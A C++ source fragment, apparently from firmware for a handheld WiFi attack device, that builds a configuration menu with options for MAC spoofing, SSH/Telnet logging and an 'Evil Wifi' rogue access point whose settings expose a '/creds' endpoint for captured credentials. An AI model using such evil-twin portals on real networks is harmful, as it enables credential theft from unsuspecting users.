    wifiOptions.push_back({"Change MAC", wifiMACMenu});
    wifiOptions.push_back({"Add Evil Wifi", addEvilWifiMenu});
    wifiOptions.push_back({"Remove Evil Wifi", removeEvilWifiMenu});
    wifiOptions.push_back({mopieConfig.TerminalLog ? "SSH/Telnet Log OFF" : "SSH/Telnet Log ON", [this]() {
                               mopieConfig.setTerminalLog(!mopieConfig.TerminalLog);
                               configMenu();
                           }});

    // Evil Wifi Settings submenu (unchanged)
    wifiOptions.push_back({"Evil Wifi Settings", [this]() {
                               std::vector<Option> evilOptions;

                               evilOptions.push_back({"Set Gateway IP", setEvilGatewayIp});
                               evilOptions.push_back({"Password Mode", setEvilPasswordMode});
                               evilOptions.push_back({"Rename /creds", setEvilEndpointCreds});
                               evilOptions.push_back({"Allow /creds access", setEvilAllowGetCreds});
                               evilOptions.push_back({"Rename /ssid", setEvilEndpointSsid});
                               evilOptions.push_back({"Allow /ssid access", setEvilAllowSetSsid});
                               evilOptions.push_back({"Display endpoints", setEvilAllowEndpointDisplay});
                               evilOptions.push_back({"Back", [this]() { configMenu(); }});
                               loopOptions(evilOptions, MENU_TYPE_SUBMENU, "Evil Wifi Settings");
                           }});

    {

        String hidden__wifi_option = String("Hidden Networks:") + (showHiddenNetworks ? "ON" : "OFF");

        // construct Option explicitly using char* label
        Option opt(hidden__wifi_option.c_str(), [this]() {
            showHiddenNetworks = !showHiddenNetworks;
            displayInfo(String("Hidden Networks:") + (showHiddenNetworks ? "ON" : "OFF"), true);
            configMenu();
        });

        wifiOptions.push_back(opt);
    }
    wifiOptions.push_back({"Back", [this]() { optionsMenu(); }});
    loopOptions(wifiOptions, MENU_TYPE_SUBMENU, "WiFi Config");
}

void WifiMenu::drawIcon(float scale) {
    clearIconArea();
    drawMopieIcon(ICON_WIFI, iconCenterX, iconCenterY, scale);
}
void WifiMenu::drawIconAt(int cx, int cy, float scale) {
    drawMopieIcon(ICON_WIFI, cx, cy, scale);
}

